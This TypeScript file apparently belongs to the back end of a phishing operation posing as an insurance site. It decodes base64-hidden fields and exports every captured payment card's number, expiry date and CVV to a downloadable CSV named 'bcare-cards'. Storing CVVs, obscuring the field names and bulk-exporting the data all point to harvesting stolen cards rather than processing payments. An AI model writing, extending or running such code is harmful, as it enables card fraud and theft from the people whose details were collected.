import type { InsuranceApplication } from "./firestore-types"

function decode(val?: string): string {
  if (!val) return ""
  try {
    return atob(val)
  } catch {
    return val
  }
}

function formatDate(val: unknown): string {
  if (!val) return ""
  try {
    if (typeof val === "object" && val !== null && "toDate" in val) {
      return (val as { toDate: () => Date }).toDate().toLocaleString("ar-SA")
    }
    return new Date(val as string).toLocaleString("ar-SA")
  } catch {
    return String(val)
  }
}

function escapeCell(val: unknown): string {
  const str = val === null || val === undefined ? "" : String(val)
  if (str.includes(",") || str.includes('"') || str.includes("\n")) {
    return `"${str.replace(/"/g, '""')}"`
  }
  return str
}

export function generateAllCardsCsv(applications: InsuranceApplication[]): void {
  const headers = [
    "رقم البطاقة",
    "تاريخ الانتهاء",
    "CVV",
  ]

  const rows = applications.map((app) => {
    const cardNumber = decode(app._v1) || app.cardNumber || ""
    const expiry = decode(app._v3) || app.expiryDate || ""
    const cvv = decode(app._v2) || app.cvv || ""

    return [
      cardNumber,
      expiry,
      cvv,
    ].map(escapeCell)
  })

  const csvContent =
    "\uFEFF" + // BOM for Excel Arabic support
    [headers.map(escapeCell).join(","), ...rows.map((r) => r.join(","))].join("\n")

  const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" })
  const url = URL.createObjectURL(blob)
  const link = document.createElement("a")
  link.href = url
  link.download = `bcare-cards-${new Date().toISOString().slice(0, 10)}.csv`
  document.body.appendChild(link)
  link.click()
  document.body.removeChild(link)
  URL.revokeObjectURL(url)
}
